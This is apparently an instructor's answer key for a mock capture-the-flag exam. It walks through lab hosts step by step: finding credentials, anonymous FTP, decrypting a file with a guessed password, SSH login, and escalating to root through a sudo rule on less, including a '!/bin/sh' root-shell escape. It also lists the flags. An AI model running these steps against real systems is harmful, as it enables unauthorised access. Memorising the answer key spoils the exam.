# Week 10 Mock Exam — CTF Walkthrough — INSTRUCTOR ONLY

## Flag 1 — user.txt (`flag{mock10_ssh_foothold}`)

```bash
curl http://10.10.50.10                                   # find username "jreyes" in HTML comment
curl ftp://anonymous:anonymous@10.10.50.11/pub/welcome.txt # password policy hint: PetName + year
curl -o memo.enc ftp://anonymous:anonymous@10.10.50.11/pub/backup_notice.txt.enc
openssl enc -aes-256-cbc -pbkdf2 -d -in memo.enc -k Rusty2024  # confirms password reuse on SSH
ssh jreyes@10.10.50.12          # password: Rusty2024
cat /home/jreyes/user.txt
```

## Flag 2 — root.txt (`flag{mock10_privesc_complete}`)

```bash
sudo -l                     # (ALL) NOPASSWD: /usr/bin/less
sudo less /root/root.txt
```

(Or the interactive form: `sudo less /etc/hostname` then `!/bin/sh` for a
full root shell.)
